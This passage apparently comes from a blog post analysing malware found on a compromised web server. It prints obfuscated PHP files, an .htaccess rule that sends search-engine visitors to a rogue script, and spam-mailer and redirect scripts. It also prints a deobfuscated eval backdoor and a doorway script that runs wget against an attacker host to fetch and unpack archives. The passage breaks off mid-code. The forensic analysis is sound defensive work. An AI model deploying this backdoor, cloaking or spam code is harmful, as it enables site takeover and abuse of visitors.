class="hljs-string">'0'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>]. $arachnids[<span class="hljs-string"><span class="hljs-string">'4'</span></span>] .$grasp[<span class="hljs-string"><span class="hljs-string">'6'</span></span>]. $indira. $bitternut[<span class="hljs-string"><span class="hljs-string">'1'</span></span>] . $bitternut[<span class="hljs-string"><span class="hljs-string">'1'</span></span>] . $grasp[<span class="hljs-string"><span class="hljs-string">'7'</span></span>].$basful[<span class="hljs-string"><span class="hljs-string">'0'</span></span>].$arachnids[<span class="hljs-string"><span class="hljs-string">'4'</span></span>]. $grasp[<span class="hljs-string"><span class="hljs-string">'5'</span></span>].$elucidate[<span class="hljs-string"><span class="hljs-string">'2'</span></span>]. $arachnids[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] .$arachnids[<span class="hljs-string"><span class="hljs-string">'2'</span></span>].$arachnids[<span class="hljs-string"><span class="hljs-string">'2'</span></span>] . $arachnids[<span class="hljs-string"><span class="hljs-string">'2'</span></span>].$bellowing );</code> </pre> </div></div><br><div class="spoiler">  <b class="spoiler_title">.htaccess - April 5, 2016</b> <div class="spoiler_text"><pre> <code class="apache hljs"><span class="hljs-attribute"><span class="hljs-nomarkup"><span class="hljs-attribute"><span class="hljs-nomarkup">RewriteEngine</span></span></span></span> <span class="hljs-literal"><span class="hljs-literal">on</span></span> RewriteCond <span class="hljs-variable"><span class="hljs-variable">%{ENV:REDIRECT_STATUS}</span></span> 200 RewriteRule ^ -<span class="hljs-meta"><span class="hljs-meta"> [L] RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR] RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing) RewriteRule ^(.*)$ bootlegger-limiter.php?$1 [L]</span></span></code> </pre> </div></div><br><div class="spoiler">  <b class="spoiler_title">bootlegger-limiter.php - April 5, 2016</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $mlksyl=<span class="hljs-string"><span class="hljs-string">"\x63"</span></span>.chr(<span class="hljs-number"><span class="hljs-number">114</span></span>).<span class="hljs-string"><span class="hljs-string">"e"</span></span>.chr(<span class="hljs-number"><span class="hljs-number">97</span></span>).chr(<span class="hljs-number"><span class="hljs-number">116</span></span>).chr(<span class="hljs-number"><span class="hljs-number">101</span></span>).<span class="hljs-string"><span class="hljs-string">"_"</span></span>.<span class="hljs-string"><span class="hljs-string">"f"</span></span>.chr(<span class="hljs-number"><span class="hljs-number">117</span></span>).<span class="hljs-string"><span class="hljs-string">"\x6e"</span></span>.<span class="hljs-string"><span class="hljs-string">"\x63"</span></span>.chr(<span class="hljs-number"><span class="hljs-number">116</span></span>).<span class="hljs-string"><span class="hljs-string">"\x69"</span></span>.<span class="hljs-string"><span class="hljs-string">"\x6f"</span></span>.<span class="hljs-string"><span class="hljs-string">"\x6e"</span></span>;$ofanpm = $mlksyl(<span class="hljs-string"><span class="hljs-string">'$a'</span></span>,strrev(<span class="hljs-string"><span class="hljs-string">';)a$(lave'</span></span>)); $ofanpm(strrev(<span class="hljs-string"><span class="hljs-string">';))"K0QfJkgCN0XCJkgCNoQD7YWdiRCIvh2YllQCJkgCN0XCJkQCK0QCJkQCJoQDJkQCJkQfJkQCJkgCN0XCJkQCJkgCNsTLtMGJJkQCJkQCJoQD7kiZ1JGJscXZuRCLsFmdkgSZjFGbwVmcp9lc0NXPmVnYkkQCJkQCJkgCNszJ+E2L8ciLy9Gaj5WYk4yJ+IyJuwGJuciI9YWZyhGIhxzJ9cXZuRSCJkQCJkQCK0wOpkSXjRyWztmbpxGJo0WayRHLiwHf8JCKlR2bsBHel1TKy9Gaj5WYkwCbkgCdzlGbJkQCJkQCJoQD7sWYlJnYpADPjRCKgYWaJkQCJkQCJoQD7lCbhZHJgMXYgwWY2pHJog2YhVmcvZWCJkQCJkgCNsTKsFmd6RCKlxmZmVHazlQCJkQCJoQD70FMbNXZoNGdh1GJ9wWY2pHJJkQCJkQCK0wegkSKzVGajRXYtRCIsYWdiRCIsISVpN3LwhXZnVmck8iIowGbh9FajRXYt91ZlJHcoYWaJkQCJkgCNsjI+E2LcxTKq4CK+oSX+41WxwFXp8jKd5DIiwlXbhSK/8jIchSPmVmcopSX+41WzxVY8ICI9ACc4V2ZlJHJJkQCJkgCNsDMy0zYkkCMy4zYkgCImlWCJkQCJoQD7kycr5WasRCKlxmZmVHazlQCJkQCK0wOx0SKztmbpxGJoQnb192YA1zYkkQCJkQCK0wOpMVROlETfdVRO9VRS9kTHl0XFxUSGx3UF5USM9VWUBVTF9FUJt0UfVETJZEL4JXdjRCKlxWamBUPztmbpxGJJkQCJkgCNsXKpgnc1NGJoMHdzlGel9VZslmZAhCImlWCJkQCK0wOiM3clNnLmZmZi4icpR2Yk0DeyV3YkkQCJkgCNoQD7kCbyVncjRCKsJXdj9Vei9VZnFGcfRXZn1jZ1JGJJkQCJoQD701JJJVVfR1UFVVUFJ1JbJVRWJVRT9FJA5SXnQ1UPh0XQRFVIdyWSVkVSV0UfRCQuIyLvoDc0RHai0DbyVncjRSCJkQCK0gCNoQD7V2csVWfJkQCK0wO0lGellQCJkgCNszJ+wWb0h2L84Tek9mYvwzJg8GajVWCJkQCK0wOi4GXiAiLgciPzNXZyRGZh9CPwgDI0J3bQByJg4CIddCVT9ESfBFVUh0JbJVRWJVRT9FJg4CInACdhBiclZnclNFInAiLgkCKu9WazJXZ2BHawBiLgcyLQhEUgcCIuASXnUkUBdFVG90UfJVRWJVRTdyWSVkVSV0UfRCIuAyJ+M3clJHZkFGPnAyboNWZJkQCJoQD7IibcJCIuAyJ+IHa8cCIvh2YllQCJkgCNsjIuxlIg4CIn4DcvwjLyVmdyV2cgMXaoRHIu9GIk5WdvZGI09mbgMXY3ByJg4CIddSSSV1XUNVRVFVRSdyWSVkVSV0UfRCIuAyJgwkUVBCZlR3clVXclJHIlhGV+AHPnAyboNWZJkQCJoQD7IibcJCIuAyJ+EDavwDZuV3bGBCdv5kPxgGPnAyboNWZJkQCJoQD7IibcJCIuAyJ+kHZvJGP+"(edoced_46esab(lave'</span></span>));<span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> </div></div><br><div class="spoiler">  <b class="spoiler_title">enthusiasms-raw.php - October 9, 2016</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">base64_url_decode</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($val)</span></span></span><span class="hljs-function"> </span></span>{   <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> base64_decode(strtr($val, <span class="hljs-string"><span class="hljs-string">'-_,'</span></span>, <span class="hljs-string"><span class="hljs-string">'+/='</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST) <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> count($_POST) &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">"chk"</span></span>])){   $val = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>();   $val[<span class="hljs-string"><span class="hljs-string">"res"</span></span>] = <span class="hljs-number"><span class="hljs-number">1</span></span>;   <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> json_encode($val); }<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{   $post_data = array_values(array_map(<span class="hljs-string"><span class="hljs-string">'stripslashes'</span></span>, $_POST));   $m_data = explode(<span class="hljs-string"><span class="hljs-string">"|||"</span></span>, base64_url_decode(strrev($post_data[<span class="hljs-number"><span class="hljs-number">0</span></span>])));   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(count($m_data) &gt; <span class="hljs-number"><span class="hljs-number">1</span></span>){   $val = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>();   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(mail($m_data[<span class="hljs-number"><span class="hljs-number">0</span></span>], $m_data[<span class="hljs-number"><span class="hljs-number">1</span></span>], $m_data[<span class="hljs-number"><span class="hljs-number">2</span></span>], $m_data[<span class="hljs-number"><span class="hljs-number">3</span></span>])){       $val[<span class="hljs-string"><span class="hljs-string">"mail"</span></span>] = <span class="hljs-number"><span class="hljs-number">1</span></span>;   } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{       $val[<span class="hljs-string"><span class="hljs-string">"mail"</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>;   }   <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> json_encode($val);   }   } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_GET) <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> count($_GET) &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>){   $url = <span class="hljs-string"><span class="hljs-string">""</span></span>;   $redic = array_values($_GET);   <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>(str_split(base64_url_decode($redic[<span class="hljs-number"><span class="hljs-number">0</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $letter){           <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(rand(<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span>) == <span class="hljs-number"><span class="hljs-number">1</span></span>){                   $url .= $letter;           }<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{                   $url .= $letter.<span class="hljs-string"><span class="hljs-string">"'+'"</span></span>;           }   } <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span> &lt;html&gt;&lt;head&gt; &lt;meta http-equiv=<span class="hljs-string"><span class="hljs-string">"content-type"</span></span> content=<span class="hljs-string"><span class="hljs-string">"text/html;charset=utf-8"</span></span>&gt; &lt;title&gt;Redirecting&lt;/title&gt; &lt;script&gt; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = <span class="hljs-string"><span class="hljs-string">'&lt;?php echo $url;?&gt;'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _0x485b=[<span class="hljs-string"><span class="hljs-string">"\x72\x65\x70\x6C\x61\x63\x65"</span></span>]; &lt;/script&gt; &lt;/head&gt; &lt;body onload=<span class="hljs-string"><span class="hljs-string">"location[_0x485b[0]](r);"</span></span>&gt; Loading... &lt;/body&gt;&lt;/html&gt; <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> } <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> </div></div><br><div class="spoiler">  <b class="spoiler_title">equaling-intangibles.php - October 9, 2016</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">base64_url_decode</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($val)</span></span></span><span class="hljs-function"> </span></span>{   <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> base64_decode(strtr($val, <span class="hljs-string"><span class="hljs-string">'-_,'</span></span>, <span class="hljs-string"><span class="hljs-string">'+/='</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST) <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> count($_POST) &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">"chk"</span></span>])){   $val = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>();   $val[<span class="hljs-string"><span class="hljs-string">"res"</span></span>] = <span class="hljs-number"><span class="hljs-number">1</span></span>;   <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> json_encode($val); }<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{   $post_data = array_values(array_map(<span class="hljs-string"><span class="hljs-string">'stripslashes'</span></span>, $_POST));   $m_data = explode(<span class="hljs-string"><span class="hljs-string">"|||"</span></span>, base64_url_decode(strrev($post_data[<span class="hljs-number"><span class="hljs-number">0</span></span>])));   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(count($m_data) &gt; <span class="hljs-number"><span class="hljs-number">1</span></span>){   $val = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>();   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(mail($m_data[<span class="hljs-number"><span class="hljs-number">0</span></span>], $m_data[<span class="hljs-number"><span class="hljs-number">1</span></span>], $m_data[<span class="hljs-number"><span class="hljs-number">2</span></span>], $m_data[<span class="hljs-number"><span class="hljs-number">3</span></span>])){       $val[<span class="hljs-string"><span class="hljs-string">"mail"</span></span>] = <span class="hljs-number"><span class="hljs-number">1</span></span>;   } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{       $val[<span class="hljs-string"><span class="hljs-string">"mail"</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>;   }   <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> json_encode($val);   }   } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_GET) <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> count($_GET) &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>){   $url = <span class="hljs-string"><span class="hljs-string">""</span></span>;   $redic = array_values($_GET);   <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>(str_split(base64_url_decode($redic[<span class="hljs-number"><span class="hljs-number">0</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $letter){           <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(rand(<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span>) == <span class="hljs-number"><span class="hljs-number">1</span></span>){                   $url .= $letter;           }<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{                   $url .= $letter.<span class="hljs-string"><span class="hljs-string">"'+'"</span></span>;           }   } <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span> &lt;html&gt;&lt;head&gt; &lt;meta http-equiv=<span class="hljs-string"><span class="hljs-string">"content-type"</span></span> content=<span class="hljs-string"><span class="hljs-string">"text/html;charset=utf-8"</span></span>&gt; &lt;title&gt;Redirecting&lt;/title&gt; &lt;script&gt; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = <span class="hljs-string"><span class="hljs-string">'&lt;?php echo $url;?&gt;'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _0x485b=[<span class="hljs-string"><span class="hljs-string">"\x72\x65\x70\x6C\x61\x63\x65"</span></span>]; &lt;/script&gt; &lt;/head&gt; &lt;body onload=<span class="hljs-string"><span class="hljs-string">"location[_0x485b[0]](r);"</span></span>&gt; Loading... &lt;/body&gt;&lt;/html&gt; <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> } <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> </div></div><br>  Let's start with the earliest files that hit the server in April ( <b>kfcgmxuu.php</b> and <b>bootlegger-limiter.php</b> ).  Obviously they are obfuscated.  Therefore, I brought them into a readable form and looked at what they were doing. <br><br>  The very first <b>kfcgmxuu.php</b> appeared, this is what it does. <br><br><pre> <code class="php hljs">$i = array_merge($_REQUEST,$_COOKIE,$_SERVER); $a = <span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($i[<span class="hljs-string"><span class="hljs-string">"elvivsvq"</span></span>])?$i[<span class="hljs-string"><span class="hljs-string">"elvivsvq"</span></span>]:(<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($i[<span class="hljs-string"><span class="hljs-string">"HTTP_ELVIVSVQ"</span></span>])?$i[<span class="hljs-string"><span class="hljs-string">"HTTP_ELVIVSVQ"</span></span>]:<span class="hljs-keyword"><span class="hljs-keyword">die</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>(strrev(base64_decode(strrev($a)));</code> </pre> <br>  To the site in cookies, headers, or in arguments with the name <b>elvivsvq, the</b> base64 encoded with MIME is sent and the code is also inverted 2 times and executed.  After this point, the attacker gains complete control over the file system of the hosting to which the web server has access.  This is a backdoor through which everything else will leak. <br><br>  Further, with the help of this backdoor, <b>.htaccess is</b> edited and <b>bootlegger-limiter.php is added</b> , and here it is, deobfuscated: <br><br><div class="spoiler">  <b class="spoiler_title">Show code</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> set_time_limit(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">get_page_by_curl</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($url, $useragent = </span></span><span class="hljs-string"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36"</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> </span></span>{   $ch = curl_init();   curl_setopt($ch, CURLOPT_URL, $url);   curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number"><span class="hljs-number">1</span></span>);   curl_setopt($ch, CURLOPT_TIMEOUT, <span class="hljs-number"><span class="hljs-number">30</span></span>);   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="hljs-number"><span class="hljs-number">0</span></span>);   curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="hljs-number"><span class="hljs-number">0</span></span>);   curl_setopt($ch, CURLOPT_USERAGENT, $useragent);   $result = curl_exec($ch);   curl_close($ch);   <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $result; } $doorcontent = <span class="hljs-string"><span class="hljs-string">""</span></span>; $x = @$_POST[<span class="hljs-string"><span class="hljs-string">"pppp_check"</span></span>]; $md5pass = <span class="hljs-string"><span class="hljs-string">"e5e4570182820af0a183ce1520afe43b"</span></span>; $host = @$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_HOST"</span></span>]; $uri = @$_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>]; $host = str_replace(<span class="hljs-string"><span class="hljs-string">"www."</span></span>, <span class="hljs-string"><span class="hljs-string">""</span></span>, $host); $md5host = md5($host); $urx = $host . $uri; $md5urx = md5($urx); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (function_exists(<span class="hljs-string"><span class="hljs-string">'sys_get_temp_dir'</span></span>)) {   $tmppath = sys_get_temp_dir();   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!is_dir($tmppath)) {       $tmppath = (dirname(<span class="hljs-keyword"><span class="hljs-keyword">__FILE__</span></span>));   } } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> {   $tmppath = (dirname(<span class="hljs-keyword"><span class="hljs-keyword">__FILE__</span></span>)); } $cdir = $tmppath . <span class="hljs-string"><span class="hljs-string">"/."</span></span> . $md5host . <span class="hljs-string"><span class="hljs-string">"/"</span></span>; $domain = <span class="hljs-string"><span class="hljs-string">"f.gghijacktest.com"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($x != <span class="hljs-string"><span class="hljs-string">""</span></span>) {   $p = md5(base64_decode(@$_POST[<span class="hljs-string"><span class="hljs-string">"p"</span></span>]));   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($p != $md5pass)       <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>;   $pa = @$_POST[<span class="hljs-string"><span class="hljs-string">"pa"</span></span>];   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (($x == <span class="hljs-string"><span class="hljs-string">"2"</span></span>) || ($x == <span class="hljs-string"><span class="hljs-string">"4"</span></span>)) {       <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"###UPDATING_FILES###\n"</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($x == <span class="hljs-string"><span class="hljs-string">"2"</span></span>) {           $cmd = <span class="hljs-string"><span class="hljs-string">"cd $tmppath; rm -rf .$md5host"</span></span>;           <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> shell_exec($cmd);       }       $cmd = <span class="hljs-string"><span class="hljs-string">"cd $tmppath; wget http://update.$domain/arc/$md5host.tgz -O 1.tgz; tar -xzf 1.tgz; rm -rf 1.tgz"</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($pa != <span class="hljs-string"><span class="hljs-string">""</span></span>) {           $pa+=<span class="hljs-number"><span class="hljs-number">0</span></span>;           $cmd = <span class="hljs-string"><span class="hljs-string">"cd $tmppath; wget http://update.$domain/arc/"</span></span> . $md5host . <span class="hljs-string"><span class="hljs-string">"_"</span></span> . $pa . <span class="hljs-string"><span class="hljs-string">".tgz -O 1.tgz; tar -xzf 1.tgz; rm -rf 1.tgz"</span></span>;       }       <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> shell_exec($cmd);       <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>;   }   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($x == <span class="hljs-string"><span class="hljs-string">"3"</span></span>) {       <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"###WORKED###\n"</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>;   } } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> {   $curx = $cdir . $md5urx;   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@file_exists($curx)) {       @<span class="hljs-keyword"><span class="hljs-keyword">list</span></span>($IDpack, $mk, $doorcontent, $pdf, $contenttype) = @explode(<span class="hljs-string"><span class="hljs-string">"|||"</span></span>, @file_get_contents($curx));       $doorcontent = @base64_decode($doorcontent);       $bot = <span class="hljs-number"><span class="hljs-number">0</span></span>;       $se = <span class="hljs-number"><span class="hljs-number">0</span></span>;       $mobile = <span class="hljs-number"><span class="hljs-number">0</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (preg_match(<span class="hljs-string"><span class="hljs-string">"#google|gsa-crawler|AdsBot-Google|Mediapartners|Googlebot-Mobile|spider|bot|yahoo|google web preview|mail\.ru|crawler|baiduspider#i"</span></span>, @$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_USER_AGENT"</span></span>]))           $bot = <span class="hljs-number"><span class="hljs-number">1</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (preg_match(<span class="hljs-string"><span class="hljs-string">"#android|symbian|iphone|ipad|series60|mobile|phone|wap|midp|mobi|mini#i"</span></span>, @$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_USER_AGENT"</span></span>]))           $mobile = <span class="hljs-number"><span class="hljs-number">1</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (preg_match(<span class="hljs-string"><span class="hljs-string">"#google|bing\.com|msn\.com|ask\.com|aol\.com|altavista|search|yahoo|conduit\.com|charter\.net|wow\.com|mywebsearch\.com|handycafe\.com|babylon\.com#i"</span></span>, @$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_REFERER"</span></span>]))           $se = <span class="hljs-number"><span class="hljs-number">1</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($bot) {           $pdf+=<span class="hljs-number"><span class="hljs-number">0</span></span>;           <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($pdf == <span class="hljs-number"><span class="hljs-number">1</span></span>) {               header(<span class="hljs-string"><span class="hljs-string">"Content-Type: application/pdf"</span></span>);           }           <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($pdf == <span class="hljs-number"><span class="hljs-number">2</span></span>) {               header(<span class="hljs-string"><span class="hljs-string">"Content-Type: image/png"</span></span>);           }           <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($pdf == <span class="hljs-number"><span class="hljs-number">3</span></span>) {               header(<span class="hljs-string"><span class="hljs-string">"Content-Type: text/xml"</span></span>);           }           <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($pdf == <span class="hljs-number"><span class="hljs-number">4</span></span>) {               $contenttype = @base64_decode($contenttype);               $types = explode(<span class="hljs-string"><span class="hljs-string">"\n"</span></span>, $contenttype);               <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($types <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $val) {                   $val = trim($val);                   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($val != <span class="hljs-string"><span class="hljs-string">""</span></span>)                       header($val);               }           }           <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $doorcontent;           <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>;       }       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($se) {           <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> get_page_by_curl(<span class="hljs-string"><span class="hljs-string">"http://$domain/lp.php?ip="</span></span> . $IDpack . <span class="hljs-string"><span class="hljs-string">"&amp;mk="</span></span> . rawurlencode($mk) . <span class="hljs-string"><span class="hljs-string">"&amp;d="</span></span> . $md5host . <span class="hljs-string"><span class="hljs-string">"&amp;u="</span></span> . $md5urx . <span class="hljs-string"><span class="hljs-string">"&amp;addr="</span></span> . $_SERVER[<span class="hljs-string"><span class="hljs-string">"REMOTE_ADDR"</span></span>], @$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_USER_AGENT"</span></span>]);           <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>;       }       header($_SERVER[<span class="hljs-string"><span class="hljs-string">'SERVER_PROTOCOL'</span></span>] . <span class="hljs-string"><span class="hljs-string">" 404 Not Found"</span></span>);       <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;'</span></span> . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'&lt;html&gt;&lt;head&gt;'</span></span> . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'&lt;title&gt;404 Not Found&lt;/title&gt;'</span></span> . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'&lt;/head&gt;&lt;body&gt;'</span></span> . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'&lt;h1&gt;Not Found&lt;/h1&gt;'</span></span> . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'&lt;p&gt;The requested URL '</span></span> . $_SERVER[<span class="hljs-string"><span class="hljs-string">'REQUEST_URI'</span></span>] . <span class="hljs-string"><span class="hljs-string">' was not found on this server.&lt;/p&gt;'</span></span> . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'&lt;hr&gt;'</span></span> . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'&lt;address&gt;'</span></span> . $_SERVER[<span class="hljs-string"><span class="hljs-string">'SERVER_SOFTWARE'</span></span>] . <span class="hljs-string"><span class="hljs-string">' PHP/'</span></span> . phpversion() . <span class="hljs-string"><span class="hljs-string">' Server at '</span></span> . $_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_HOST'</span></span>] . <span class="hljs-string"><span class="hljs-string">' Port 80&lt;/address&gt;'</span></span> . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'&lt;/body&gt;&lt;/html&gt;'</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>;   } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> {       $crurl = <span class="hljs-string"><span class="hljs-string">"http://"</span></span> . @$_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_HOST'</span></span>] . @$_SERVER[<span class="hljs-string"><span class="hljs-string">'REQUEST_URI'</span></span>];       $buf = get_page_by_curl($crurl);       $curx = $cdir . <span class="hljs-string"><span class="hljs-string">"fff.sess"</span></span>;       <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@file_exists($curx)) {           $links = @file($curx, FILE_SKIP_EMPTY_LINES | 